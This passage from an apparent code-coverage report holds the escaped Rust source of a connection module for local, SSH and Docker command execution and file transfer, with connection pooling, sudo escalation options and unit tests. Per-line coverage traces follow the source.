\"russh\")]\n#[derive(Debug)]\npub struct RusshError(pub ::russh::Error);\n\n#[cfg(feature = \"russh\")]\nimpl From\u003c::russh::Error\u003e for RusshError {\n    fn from(err: ::russh::Error) -\u003e Self {\n        RusshError(err)\n    }\n}\n\n#[cfg(feature = \"russh\")]\nimpl std::fmt::Display for RusshError {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        write!(f, \"Russh error: {}\", self.0)\n    }\n}\n\n#[cfg(feature = \"russh\")]\nimpl std::error::Error for RusshError {}\n\n#[cfg(feature = \"russh\")]\nimpl From\u003c::russh::Error\u003e for ConnectionError {\n    fn from(err: ::russh::Error) -\u003e Self {\n        ConnectionError::SshError(format!(\"Russh error: {}\", err))\n    }\n}\n\n#[cfg(feature = \"russh\")]\nimpl From\u003crussh_sftp::client::error::Error\u003e for ConnectionError {\n    fn from(e: russh_sftp::client::error::Error) -\u003e Self {\n        ConnectionError::TransferFailed(format!(\"SFTP error: {}\", e))\n    }\n}\n\n/// Errors that can occur during connection operations\n#[derive(Error, Debug)]\npub enum ConnectionError {\n    #[error(\"Connection failed: {0}\")]\n    ConnectionFailed(String),\n\n    #[error(\"Authentication failed: {0}\")]\n    AuthenticationFailed(String),\n\n    #[error(\"Command execution failed: {0}\")]\n    ExecutionFailed(String),\n\n    #[error(\"File transfer failed: {0}\")]\n    TransferFailed(String),\n\n    #[error(\"Connection timeout after {0} seconds\")]\n    Timeout(u64),\n\n    #[error(\"Host not found: {0}\")]\n    HostNotFound(String),\n\n    #[error(\"Invalid configuration: {0}\")]\n    InvalidConfig(String),\n\n    #[error(\"SSH error: {0}\")]\n    SshError(String),\n\n    #[error(\"IO error: {0}\")]\n    IoError(#[from] std::io::Error),\n\n    #[error(\"Connection pool exhausted\")]\n    PoolExhausted,\n\n    #[error(\"Connection closed\")]\n    ConnectionClosed,\n\n    #[error(\"Docker error: {0}\")]\n    DockerError(String),\n\n    #[error(\"Unsupported operation: {0}\")]\n    UnsupportedOperation(String),\n}\n\n/// Result type for connection operations\npub type ConnectionResult\u003cT\u003e = Result\u003cT, ConnectionError\u003e;\n\n/// Result of executing a command\n#[derive(Debug, Clone)]\npub struct CommandResult {\n    /// Exit code of the command\n    pub exit_code: i32,\n    /// Standard output\n    pub stdout: String,\n    /// Standard error\n    pub stderr: String,\n    /// Whether the command was successful (exit code 0)\n    pub success: bool,\n}\n\nimpl CommandResult {\n    /// Create a new successful command result\n    pub fn success(stdout: String, stderr: String) -\u003e Self {\n        Self {\n            exit_code: 0,\n            stdout,\n            stderr,\n            success: true,\n        }\n    }\n\n    /// Create a new failed command result\n    pub fn failure(exit_code: i32, stdout: String, stderr: String) -\u003e Self {\n        Self {\n            exit_code,\n            stdout,\n            stderr,\n            success: false,\n        }\n    }\n\n    /// Get the combined output (stdout + stderr)\n    pub fn combined_output(\u0026self) -\u003e String {\n        if self.stderr.is_empty() {\n            self.stdout.clone()\n        } else if self.stdout.is_empty() {\n            self.stderr.clone()\n        } else {\n            format!(\"{}\\n{}\", self.stdout, self.stderr)\n        }\n    }\n}\n\n/// Options for command execution\n#[derive(Debug, Clone, Default)]\npub struct ExecuteOptions {\n    /// Working directory for the command\n    pub cwd: Option\u003cString\u003e,\n    /// Environment variables to set\n    pub env: HashMap\u003cString, String\u003e,\n    /// Timeout in seconds (None for no timeout)\n    pub timeout: Option\u003cu64\u003e,\n    /// Run command with privilege escalation (sudo/su)\n    pub escalate: bool,\n    /// User to escalate to (default: root)\n    pub escalate_user: Option\u003cString\u003e,\n    /// Method for privilege escalation (sudo, su, etc.)\n    pub escalate_method: Option\u003cString\u003e,\n    /// Password for privilege escalation operations\n    pub escalate_password: Option\u003cString\u003e,\n}\n\nimpl ExecuteOptions {\n    /// Create new execute options\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set the working directory\n    pub fn with_cwd(mut self, cwd: impl Into\u003cString\u003e) -\u003e Self {\n        self.cwd = Some(cwd.into());\n        self\n    }\n\n    /// Add an environment variable\n    pub fn with_env(mut self, key: impl Into\u003cString\u003e, value: impl Into\u003cString\u003e) -\u003e Self {\n        self.env.insert(key.into(), value.into());\n        self\n    }\n\n    /// Set the timeout\n    pub fn with_timeout(mut self, timeout: u64) -\u003e Self {\n        self.timeout = Some(timeout);\n        self\n    }\n\n    /// Enable privilege escalation\n    pub fn with_escalation(mut self, user: Option\u003cString\u003e) -\u003e Self {\n        self.escalate = true;\n        self.escalate_user = user;\n        self\n    }\n}\n\n/// Options for file transfer\n#[derive(Debug, Clone, Default)]\npub struct TransferOptions {\n    /// File mode (permissions) to set\n    pub mode: Option\u003cu32\u003e,\n    /// Owner to set\n    pub owner: Option\u003cString\u003e,\n    /// Group to set\n    pub group: Option\u003cString\u003e,\n    /// Create parent directories if they don't exist\n    pub create_dirs: bool,\n    /// Backup existing file before overwriting\n    pub backup: bool,\n}\n\nimpl TransferOptions {\n    /// Create new transfer options\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set file mode\n    pub fn with_mode(mut self, mode: u32) -\u003e Self {\n        self.mode = Some(mode);\n        self\n    }\n\n    /// Set owner\n    pub fn with_owner(mut self, owner: impl Into\u003cString\u003e) -\u003e Self {\n        self.owner = Some(owner.into());\n        self\n    }\n\n    /// Set group\n    pub fn with_group(mut self, group: impl Into\u003cString\u003e) -\u003e Self {\n        self.group = Some(group.into());\n        self\n    }\n\n    /// Enable directory creation\n    pub fn with_create_dirs(mut self) -\u003e Self {\n        self.create_dirs = true;\n        self\n    }\n}\n\n/// The main connection trait that all transport implementations must implement\n#[async_trait]\npub trait Connection: Send + Sync {\n    /// Get the connection identifier (hostname or container name)\n    fn identifier(\u0026self) -\u003e \u0026str;\n\n    /// Check if the connection is still alive\n    async fn is_alive(\u0026self) -\u003e bool;\n\n    /// Execute a command on the remote host\n    async fn execute(\n        \u0026self,\n        command: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e;\n\n    /// Upload a file to the remote host\n    async fn upload(\n        \u0026self,\n        local_path: \u0026Path,\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e;\n\n    /// Upload content directly to a remote file\n    async fn upload_content(\n        \u0026self,\n        content: \u0026[u8],\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e;\n\n    /// Download a file from the remote host\n    async fn download(\u0026self, remote_path: \u0026Path, local_path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e;\n\n    /// Download a file content from the remote host\n    async fn download_content(\u0026self, remote_path: \u0026Path) -\u003e ConnectionResult\u003cVec\u003cu8\u003e\u003e;\n\n    /// Check if a path exists on the remote host\n    async fn path_exists(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e;\n\n    /// Check if a path is a directory on the remote host\n    async fn is_directory(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e;\n\n    /// Get file stats (size, mode, owner, etc.)\n    async fn stat(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cFileStat\u003e;\n\n    /// Close the connection\n    async fn close(\u0026self) -\u003e ConnectionResult\u003c()\u003e;\n\n    /// Execute multiple commands in batch (default: sequential)\n    ///\n    /// This method executes multiple commands and returns results in the same\n    /// order as input commands. The default implementation runs commands\n    /// sequentially. Transport implementations (like Russh) may override this\n    /// to provide parallel execution using channel multiplexing.\n    async fn execute_batch(\n        \u0026self,\n        commands: \u0026[\u0026str],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e Vec\u003cConnectionResult\u003cCommandResult\u003e\u003e {\n        let mut results = Vec::with_capacity(commands.len());\n        for cmd in commands {\n            results.push(self.execute(cmd, options.clone()).await);\n        }\n        results\n    }\n}\n\n/// File statistics\n#[derive(Debug, Clone)]\npub struct FileStat {\n    /// File size in bytes\n    pub size: u64,\n    /// File mode (permissions)\n    pub mode: u32,\n    /// Owner UID\n    pub uid: u32,\n    /// Group GID\n    pub gid: u32,\n    /// Last access time (Unix timestamp)\n    pub atime: i64,\n    /// Last modification time (Unix timestamp)\n    pub mtime: i64,\n    /// Is this a directory?\n    pub is_dir: bool,\n    /// Is this a regular file?\n    pub is_file: bool,\n    /// Is this a symbolic link?\n    pub is_symlink: bool,\n}\n\n/// Connection type enum for factory pattern\n#[derive(Debug, Clone, PartialEq, Eq, Hash)]\npub enum ConnectionType {\n    /// Local connection (no network)\n    Local,\n    /// SSH connection to remote host\n    Ssh {\n        host: String,\n        port: u16,\n        user: String,\n    },\n    /// Docker container connection\n    Docker { container: String },\n}\n\nimpl ConnectionType {\n    /// Get a unique key for this connection type (for pooling)\n    pub fn pool_key(\u0026self) -\u003e String {\n        match self {\n            ConnectionType::Local =\u003e \"local\".to_string(),\n            ConnectionType::Ssh { host, port, user } =\u003e format!(\"ssh://{}@{}:{}\", user, host, port),\n            ConnectionType::Docker { container } =\u003e format!(\"docker://{}\", container),\n        }\n    }\n}\n\n/// Factory for creating connections\npub struct ConnectionFactory {\n    /// Global configuration\n    config: Arc\u003cConnectionConfig\u003e,\n    /// Connection pool\n    pool: Arc\u003cRwLock\u003cConnectionPool\u003e\u003e,\n}\n\nimpl ConnectionFactory {\n    /// Create a new connection factory\n    pub fn new(config: ConnectionConfig) -\u003e Self {\n        Self {\n            config: Arc::new(config),\n            pool: Arc::new(RwLock::new(ConnectionPool::new(10))), // Default pool size of 10\n        }\n    }\n\n    /// Create a new connection factory with custom pool size\n    pub fn with_pool_size(config: ConnectionConfig, pool_size: usize) -\u003e Self {\n        Self {\n            config: Arc::new(config),\n            pool: Arc::new(RwLock::new(ConnectionPool::new(pool_size))),\n        }\n    }\n\n    /// Get a connection for a host\n    pub async fn get_connection(\n        \u0026self,\n        host: \u0026str,\n    ) -\u003e ConnectionResult\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        let conn_type = self.resolve_connection_type(host)?;\n        let pool_key = conn_type.pool_key();\n\n        // Try to get from pool first\n        if let Some(conn) = self.pool.write().get(\u0026pool_key) {\n            if conn.is_alive().await {\n                return Ok(conn);\n            }\n        }\n\n        // Create new connection\n        let conn = self.create_connection(\u0026conn_type).await?;\n\n        // Add to pool\n        self.pool.write().put(pool_key, conn.clone());\n\n        Ok(conn)\n    }\n\n    /// Resolve a host name to a connection type\n    fn resolve_connection_type(\u0026self, host: \u0026str) -\u003e ConnectionResult\u003cConnectionType\u003e {\n        // Check for special connection types\n        if host == \"localhost\" || host == \"127.0.0.1\" || host == \"local\" {\n            // Check if we should use local connection\n            if let Some(host_config) = self.config.get_host(host) {\n                if host_config.connection == Some(\"local\".to_string()) {\n                    return Ok(ConnectionType::Local);\n                }\n            }\n            // Default to local for localhost\n            return Ok(ConnectionType::Local);\n        }\n\n        // Check for docker connection\n        if host.starts_with(\"docker://\") {\n            let container = host.strip_prefix(\"docker://\").unwrap().to_string();\n            return Ok(ConnectionType::Docker { container });\n        }\n\n        // Default to SSH\n        let host_config = self.config.get_host(host);\n        let (actual_host, port, user) = if let Some(hc) = host_config {\n            (\n                hc.hostname.clone().unwrap_or_else(|| host.to_string()),\n                hc.port.unwrap_or(22),\n                hc.user\n                    .clone()\n                    .unwrap_or_else(|| self.config.defaults.user.clone()),\n            )\n        } else {\n            (host.to_string(), 22, self.config.defaults.user.clone())\n        };\n\n        Ok(ConnectionType::Ssh {\n            host: actual_host,\n            port,\n            user,\n        })\n    }\n\n    /// Create a new connection based on type\n    async fn create_connection(\n        \u0026self,\n        conn_type: \u0026ConnectionType,\n    ) -\u003e ConnectionResult\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        match conn_type {\n            ConnectionType::Local =\u003e {\n                let conn = local::LocalConnection::new();\n                Ok(Arc::new(conn))\n            }\n            ConnectionType::Ssh { host, port, user } =\u003e {\n                let host_config = self.config.get_host(host).cloned();\n                // Prefer russh (pure Rust) when available, fall back to ssh2\n                #[cfg(feature = \"russh\")]\n                {\n                    let conn = russh::RusshConnection::connect(\n                        host,\n                        *port,\n                        user,\n                        host_config,\n                        \u0026self.config,\n                    )\n                    .await?;\n                    Ok(Arc::new(conn))\n                }\n                #[cfg(all(feature = \"ssh2-backend\", not(feature = \"russh\")))]\n                {\n                    let conn =\n                        ssh::SshConnection::connect(host, *port, user, host_config, \u0026self.config)\n                            .await?;\n                    Ok(Arc::new(conn))\n                }\n                #[cfg(not(any(feature = \"russh\", feature = \"ssh2-backend\")))]\n                {\n                    Err(ConnectionError::InvalidConfig(\n                        \"No SSH backend available. Enable 'russh' or 'ssh2-backend' feature.\"\n                            .to_string(),\n                    ))\n                }\n            }\n            ConnectionType::Docker { container } =\u003e {\n                let conn = docker::DockerConnection::new(container.clone());\n                Ok(Arc::new(conn))\n            }\n        }\n    }\n\n    /// Close all connections in the pool\n    pub async fn close_all(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        let connections: Vec\u003c_\u003e = {\n            let mut pool = self.pool.write();\n            pool.drain()\n        };\n\n        for conn in connections {\n            let _ = conn.close().await;\n        }\n\n        Ok(())\n    }\n\n    /// Get pool statistics\n    pub fn pool_stats(\u0026self) -\u003e PoolStats {\n        self.pool.read().stats()\n    }\n}\n\n/// Connection pool for reusing connections\npub struct ConnectionPool {\n    /// Maximum number of connections per host\n    max_connections: usize,\n    /// Active connections by pool key\n    connections: HashMap\u003cString, Arc\u003cdyn Connection + Send + Sync\u003e\u003e,\n}\n\nimpl ConnectionPool {\n    /// Create a new connection pool\n    pub fn new(max_connections: usize) -\u003e Self {\n        Self {\n            max_connections,\n            connections: HashMap::new(),\n        }\n    }\n\n    /// Get a connection from the pool\n    pub fn get(\u0026mut self, key: \u0026str) -\u003e Option\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        self.connections.get(key).cloned()\n    }\n\n    /// Put a connection into the pool\n    pub fn put(\u0026mut self, key: String, conn: Arc\u003cdyn Connection + Send + Sync\u003e) {\n        // Evict old connections if pool is full\n        if self.connections.len() \u003e= self.max_connections {\n            // Remove oldest connection (simple FIFO for now)\n            if let Some(oldest_key) = self.connections.keys().next().cloned() {\n                self.connections.remove(\u0026oldest_key);\n            }\n        }\n        self.connections.insert(key, conn);\n    }\n\n    /// Remove a connection from the pool\n    pub fn remove(\u0026mut self, key: \u0026str) -\u003e Option\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        self.connections.remove(key)\n    }\n\n    /// Drain all connections from the pool\n    pub fn drain(\u0026mut self) -\u003e Vec\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        self.connections.drain().map(|(_, v)| v).collect()\n    }\n\n    /// Get pool statistics\n    pub fn stats(\u0026self) -\u003e PoolStats {\n        PoolStats {\n            active_connections: self.connections.len(),\n            max_connections: self.max_connections,\n        }\n    }\n}\n\n/// Pool statistics\n#[derive(Debug, Clone)]\npub struct PoolStats {\n    /// Number of active connections\n    pub active_connections: usize,\n    /// Maximum number of connections allowed\n    pub max_connections: usize,\n}\n\n/// Builder for creating connections with custom options\npub struct ConnectionBuilder {\n    host: String,\n    port: Option\u003cu16\u003e,\n    user: Option\u003cString\u003e,\n    password: Option\u003cString\u003e,\n    private_key: Option\u003cString\u003e,\n    timeout: Option\u003cu64\u003e,\n    connection_type: Option\u003cString\u003e,\n}\n\nimpl ConnectionBuilder {\n    /// Create a new connection builder\n    pub fn new(host: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            host: host.into(),\n            port: None,\n            user: None,\n            password: None,\n            private_key: None,\n            timeout: None,\n            connection_type: None,\n        }\n    }\n\n    /// Set the port\n    pub fn port(mut self, port: u16) -\u003e Self {\n        self.port = Some(port);\n        self\n    }\n\n    /// Set the user\n    pub fn user(mut self, user: impl Into\u003cString\u003e) -\u003e Self {\n        self.user = Some(user.into());\n        self\n    }\n\n    /// Set the password\n    pub fn password(mut self, password: impl Into\u003cString\u003e) -\u003e Self {\n        self.password = Some(password.into());\n        self\n    }\n\n    /// Set the private key path\n    pub fn private_key(mut self, key_path: impl Into\u003cString\u003e) -\u003e Self {\n        self.private_key = Some(key_path.into());\n        self\n    }\n\n    /// Set the connection timeout\n    pub fn timeout(mut self, timeout: u64) -\u003e Self {\n        self.timeout = Some(timeout);\n        self\n    }\n\n    /// Set the connection type explicitly\n    pub fn connection_type(mut self, conn_type: impl Into\u003cString\u003e) -\u003e Self {\n        self.connection_type = Some(conn_type.into());\n        self\n    }\n\n    /// Build and connect\n    pub async fn connect(self) -\u003e ConnectionResult\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        // Determine connection type\n        let conn_type = if let Some(ct) = \u0026self.connection_type {\n            match ct.as_str() {\n                \"local\" =\u003e ConnectionType::Local,\n                \"docker\" =\u003e ConnectionType::Docker {\n                    container: self.host.clone(),\n                },\n                \"ssh\" | _ =\u003e ConnectionType::Ssh {\n                    host: self.host.clone(),\n                    port: self.port.unwrap_or(22),\n                    user: self.user.clone().unwrap_or_else(whoami),\n                },\n            }\n        } else if self.host == \"localhost\" || self.host == \"127.0.0.1\" || self.host == \"local\" {\n            ConnectionType::Local\n        } else if self.host.starts_with(\"docker://\") {\n            ConnectionType::Docker {\n                container: self.host.strip_prefix(\"docker://\").unwrap().to_string(),\n            }\n        } else {\n            ConnectionType::Ssh {\n                host: self.host.clone(),\n                port: self.port.unwrap_or(22),\n                user: self.user.clone().unwrap_or_else(whoami),\n            }\n        };\n\n        // Create connection based on type\n        match conn_type {\n            ConnectionType::Local =\u003e Ok(Arc::new(local::LocalConnection::new())),\n            ConnectionType::Ssh { host, port, user } =\u003e {\n                // Build host config from builder options\n                let host_config = HostConfig {\n                    hostname: Some(host.clone()),\n                    port: Some(port),\n                    user: Some(user.clone()),\n                    identity_file: self.private_key.clone(),\n                    password: self.password.clone(),\n                    connect_timeout: self.timeout,\n                    ..Default::default()\n                };\n\n                let config = ConnectionConfig::default();\n                // Prefer russh (pure Rust) when available, fall back to ssh2\n                #[cfg(feature = \"russh\")]\n                {\n                    let conn = russh::RusshConnection::connect(\n                        \u0026host,\n                        port,\n                        \u0026user,\n                        Some(host_config),\n                        \u0026config,\n                    )\n                    .await?;\n                    Ok(Arc::new(conn))\n                }\n                #[cfg(all(feature = \"ssh2-backend\", not(feature = \"russh\")))]\n                {\n                    let conn =\n                        ssh::SshConnection::connect(\u0026host, port, \u0026user, Some(host_config), \u0026config)\n                            .await?;\n                    Ok(Arc::new(conn))\n                }\n                #[cfg(not(any(feature = \"russh\", feature = \"ssh2-backend\")))]\n                {\n                    let _ = (host, port, user, host_config, config); // silence unused warnings\n                    Err(ConnectionError::InvalidConfig(\n                        \"No SSH backend available. Enable 'russh' or 'ssh2-backend' feature.\"\n                            .to_string(),\n                    ))\n                }\n            }\n            ConnectionType::Docker { container } =\u003e {\n                Ok(Arc::new(docker::DockerConnection::new(container)))\n            }\n        }\n    }\n}\n\n/// Get the current username\nfn whoami() -\u003e String {\n    std::env::var(\"USER\")\n        .or_else(|_| std::env::var(\"USERNAME\"))\n        .unwrap_or_else(|_| \"root\".to_string())\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_command_result_success() {\n        let result = CommandResult::success(\"output\".to_string(), \"\".to_string());\n        assert!(result.success);\n        assert_eq!(result.exit_code, 0);\n        assert_eq!(result.stdout, \"output\");\n    }\n\n    #[test]\n    fn test_command_result_failure() {\n        let result = CommandResult::failure(1, \"\".to_string(), \"error\".to_string());\n        assert!(!result.success);\n        assert_eq!(result.exit_code, 1);\n        assert_eq!(result.stderr, \"error\");\n    }\n\n    #[test]\n    fn test_connection_type_pool_key() {\n        assert_eq!(ConnectionType::Local.pool_key(), \"local\");\n        assert_eq!(\n            ConnectionType::Ssh {\n                host: \"example.com\".to_string(),\n                port: 22,\n                user: \"user\".to_string()\n            }\n            .pool_key(),\n            \"ssh://user@example.com:22\"\n        );\n        assert_eq!(\n            ConnectionType::Docker {\n                container: \"mycontainer\".to_string()\n            }\n            .pool_key(),\n            \"docker://mycontainer\"\n        );\n    }\n\n    #[test]\n    fn test_execute_options_builder() {\n        let options = ExecuteOptions::new()\n            .with_cwd(\"/tmp\")\n            .with_env(\"FOO\", \"bar\")\n            .with_timeout(30)\n            .with_escalation(Some(\"root\".to_string()));\n\n        assert_eq!(options.cwd, Some(\"/tmp\".to_string()));\n        assert_eq!(options.env.get(\"FOO\"), Some(\u0026\"bar\".to_string()));\n        assert_eq!(options.timeout, Some(30));\n        assert!(options.escalate);\n        assert_eq!(options.escalate_user, Some(\"root\".to_string()));\n    }\n}\n","traces":[{"line":60,"address":[30316592],"length":1,"stats":{"Line":0}},{"line":61,"address":[30316600],"length":1,"stats":{"Line":0}},{"line":67,"address":[30304304],"length":1,"stats":{"Line":0}},{"line":68,"address":[30304329],"length":1,"stats":{"Line":0}},{"line":77,"address":[30316624,30316858],"length":1,"stats":{"Line":0}},{"line":78,"address":[30316646,30316710],"length":1,"stats":{"Line":0}},{"line":84,"address":[30298816,30299050],"length":1,"stats":{"Line":0}},{"line":85,"address":[30298838,30298902],"length":1,"stats":{"Line":0}},{"line":150,"address":[30312016],"length":1,"stats":{"Line":1}},{"line":160,"address":[30311952],"length":1,"stats":{"Line":1}},{"line":170,"address":[30311632],"length":1,"stats":{"Line":0}},{"line":171,"address":[30311670],"length":1,"stats":{"Line":0}},{"line":172,"address":[30311713],"length":1,"stats":{"Line":0}},{"line":173,"address":[30311688],"length":1,"stats":{"Line":0}},{"line":174,"address":[30311914],"length":1,"stats":{"Line":0}},{"line":176,"address":[30311729],"length":1,"stats":{"Line":0}},{"line":202,"address":[30313776],"length":1,"stats":{"Line":1}},{"line":203,"address":[30313784],"length":1,"stats":{"Line":1}},{"line":207,"address":[31331968,31331712,31332256,31332492,31332236,31331943],"length":1,"stats":{"Line":1}},{"line":208,"address":[31331742,31332088,31332026,31331801,31332291,31332350],"length":1,"stats":{"Line":2}},{"line":209,"address":[31331923,31332213,31332472],"length":1,"stats":{"Line":1}},{"line":213,"address":[31333281,31332878,31332858,31332512,31333301,31332896],"length":1,"stats":{"Line":1}},{"line":214,"address":[31332670,31333262,31333093,31332568,31332986,31332839],"length":1,"stats":{"Line":2}},{"line":215,"address":[31332816,31333239],"length":1,"stats":{"Line":1}},{"line":219,"address":[30313552],"length":1,"stats":{"Line":1}},{"line":220,"address":[30313569],"length":1,"stats":{"Line":1}},{"line":221,"address":[30313580],"length":1,"stats":{"Line":1}},{"line":225,"address":[30313760,30313600],"length":1,"stats":{"Line":1}},{"line":226,"address":[30313632],"length":1,"stats":{"Line":1}},{"line":227,"address":[30313717,30313639],"length":1,"stats":{"Line":2}},{"line":228,"address":[30313740],"length":1,"stats":{"Line":1}},{"line":249,"address":[30313840],"length":1,"stats":{"Line":0}},{"line":250,"address":[30313848],"length":1,"stats":{"Line":0}},{"line":254,"address":[30313872],"length":1,"stats":{"Line":0}},{"line":255,"address":[30313888],"length":1,"stats":{"Line":0}},{"line":256,"address":[30313898],"length":1,"stats":{"Line":0}},{"line":260,"address":[31333616,31333878],"length":1,"stats":{"Line":0}},{"line":261,"address":[31333674,31333736],"length":1,"stats":{"Line":0}},{"line":262,"address":[31333855],"length":1,"stats":{"Line":0}},{"line":266,"address":[31333596,31333328],"length":1,"stats":{"Line":0}},{"line":267,"address":[31333386,31333448],"length":1,"stats":{"Line":0}},{"line":268,"address":[31333573],"length":1,"stats":{"Line":0}},{"line":272,"address":[30313808],"length":1,"stats":{"Line":0}},{"line":273,"address":[30313816],"length":1,"stats":{"Line":0}},{"line":274,"address":[30313820],"length":1,"stats":{"Line":0}},{"line":334,"address":[27827558],"length":1,"stats":{"Line":0}},{"line":339,"address":[31327875,31329235,31330595],"length":1,"stats":{"Line":0}},{"line":340,"address":[31328151,31328518,31329420,31329530,31330871,31330890,31328060,31328170,31329511,31329878,31331238,31330780],"length":1,"stats":{"Line":0}},{"line":341,"address":[26097613,26101901,26097341],"length":1,"stats":{"Line":0}},{"line":343,"address":[31330014,31331374,31328654],"length":1,"stats":{"Line":0}},{"line":387,"address":[30312960],"length":1,"stats":{"Line":1}},{"line":388,"address":[30312989],"length":1,"stats":{"Line":1}},{"line":389,"address":[30313057],"length":1,"stats":{"Line":1}},{"line":390,"address":[30313084],"length":1,"stats":{"Line":1}},{"line":391,"address":[30313376],"length":1,"stats":{"Line":1}},{"line":406,"address":[30316048,30316166],"length":1,"stats":{"Line":0}},{"line":408,"address":[30316055],"length":1,"stats":{"Line":0}},{"line":409,"address":[30316075,30316126],"length":1,"stats":{"Line":0}},{"line":414,"address":[30314288,30314419],"length":1,"stats":{"Line":0}},{"line":416,"address":[30314308],"length":1,"stats":{"Line":0}},{"line":417,"address":[30314328,30314379],"length":1,"stats":{"Line":0}},{"line":422,"address":[30314240],"length":1,"stats":{"Line":0}},{"line":426,"address":[31339046,31339192,31340112],"length":1,"stats":{"Line":0}},{"line":427,"address":[31339495,31339428],"length":1,"stats":{"Line":0}},{"line":430,"address":[31339580,31339499,31339712],"length":1,"stats":{"Line":0}},{"line":431,"address":[31339095,31340231,31339909,31340005],"length":1,"stats":{"Line":0}},{"line":432,"address":[31340458],"length":1,"stats":{"Line":0}},{"line":437,"address":[31340519,31339116,31341442,31340659],"length":1,"stats":{"Line":0}},{"line":440,"address":[31341410,31341017,31341082,31341239],"length":1,"stats":{"Line":0}},{"line":442,"address":[31341348],"length":1,"stats":{"Line":0}},{"line":446,"address":[30314496,30315568,30315574],"length":1,"stats":{"Line":0}},{"line":448,"address":[30314652,30314536],"length":1,"stats":{"Line":0}},{"line":450,"address":[30314587,30315776],"length":1,"stats":{"Line":0}},{"line":451,"address":[30315789,30315918],"length":1,"stats":{"Line":0}},{"line":452,"address":[30315998],"length":1,"stats":{"Line":0}},{"line":456,"address":[30315877],"length":1,"stats":{"Line":0}},{"line":460,"address":[30314674],"length":1,"stats":{"Line":0}},{"line":461,"address":[30314782],"length":1,"stats":{"Line":0}},{"line":462,"address":[30314851],"length":1,"stats":{"Line":0}},{"line":466,"address":[30314711],"length":1,"stats":{"Line":0}},{"line":467,"address":[30315329,30315758,30314742,30314940],"length":1,"stats":{"Line":0}},{"line":469,"address":[31343541,31343520],"length":1,"stats":{"Line":0}},{"line":470,"address":[30315027],"length":1,"stats":{"Line":0}},{"line":471,"address":[30315157],"length":1,"stats":{"Line":0}},{"line":472,"address":[30315161],"length":1,"stats":{"Line":0}},{"line":473,"address":[31343568,31343600],"length":1,"stats":{"Line":0}},{"line":476,"address":[30315587,30315061],"length":1,"stats":{"Line":0}},{"line":479,"address":[30315441],"length":1,"stats":{"Line":0}},{"line":487,"address":[30314448],"length":1,"stats":{"Line":0}},{"line":491,"address":[31341699],"length":1,"stats":{"Line":0}},{"line":493,"address":[31341817],"length":1,"stats":{"Line":0}},{"line":494,"address":[31342012],"length":1,"stats":{"Line":0}},{"line":496,"address":[31341843],"length":1,"stats":{"Line":0}},{"line":497,"address":[31341894,31342206],"length":1,"stats":{"Line":0}},{"line":502,"address":[31342314],"length":1,"stats":{"Line":0}},{"line":503,"address":[31342435],"length":1,"stats":{"Line":0}},{"line":504,"address":[31342443],"length":1,"stats":{"Line":0}},{"line":505,"address":[31342500],"length":1,"stats":{"Line":0}},{"line":506,"address":[31342553],"length":1,"stats":{"Line":0}},{"line":508,"address":[31342745,31343088,31342704,31341796,31343146,31342916],"length":1,"stats":{"Line":0}},{"line":509,"address":[31343399,31343309],"length":1,"stats":{"Line":0}},{"line":526,"address":[31341920],"length":1,"stats":{"Line":0}},{"line":527,"address":[31342810,31341932],"length":1,"stats":{"Line":0}},{"line":528,"address":[31342825],"length":1,"stats":{"Line":0}},{"line":534,"address":[31344073,31343788,31343670,31343632,31343740],"length":1,"stats":{"Line":0}},{"line":536,"address":[31343724,31343832],"length":1,"stats":{"Line":0}},{"line":537,"address":[31343872,31343934],"length":1,"stats":{"Line":0}},{"line":540,"address":[31344037,31344470,31343972],"length":1,"stats":{"Line":0}},{"line":541,"address":[31343770,31344110,31344131,31344661,31344532,31344383],"length":1,"stats":{"Line":0}},{"line":544,"address":[31344580],"length":1,"stats":{"Line":0}},{"line":548,"address":[30314096,30314230,30314224],"length":1,"stats":{"Line":0}},{"line":549,"address":[30314105,30314184],"length":1,"stats":{"Line":0}},{"line":563,"address":[30312128],"length":1,"stats":{"Line":0}},{"line":566,"address":[30312152],"length":1,"stats":{"Line":0}},{"line":571,"address":[30312080],"length":1,"stats":{"Line":0}},{"line":572,"address":[30312098],"length":1,"stats":{"Line":0}},{"line":576,"address":[30312208,30312685,30312764],"length":1,"stats":{"Line":0}},{"line":578,"address":[30312338,30312243],"length":1,"stats":{"Line":0}},{"line":580,"address":[30312441],"length":1,"stats":{"Line":0}},{"line":581,"address":[30312632,30312563],"length":1,"stats":{"Line":0}},{"line":584,"address":[30312354,30312701],"length":1,"stats":{"Line":0}},{"line":588,"address":[30312928],"length":1,"stats":{"Line":0}},{"line":589,"address":[30312946],"length":1,"stats":{"Line":0}},{"line":593,"address":[30312800],"length":1,"stats":{"Line":0}},{"line":594,"address":[30312824],"length":1,"stats":{"Line":0}},{"line":598,"address":[30312880],"length":1,"stats":{"Line":0}},{"line":600,"address":[30312894],"length":1,"stats":{"Line":0}},{"line":601,"address":[30312904],"length":1,"stats":{"Line":0}},{"line":628,"address":[],"length":0,"stats":{"Line":0}},{"line":630,"address":[],"length":0,"stats":{"Line":0}},{"line":641,"address":[30313920],"length":1,"stats":{"Line":0}},{"line":642,"address":[30313940],"length":1,"stats":{"Line":0}},{"line":643,"address":[30313956],"length":1,"stats":{"Line":0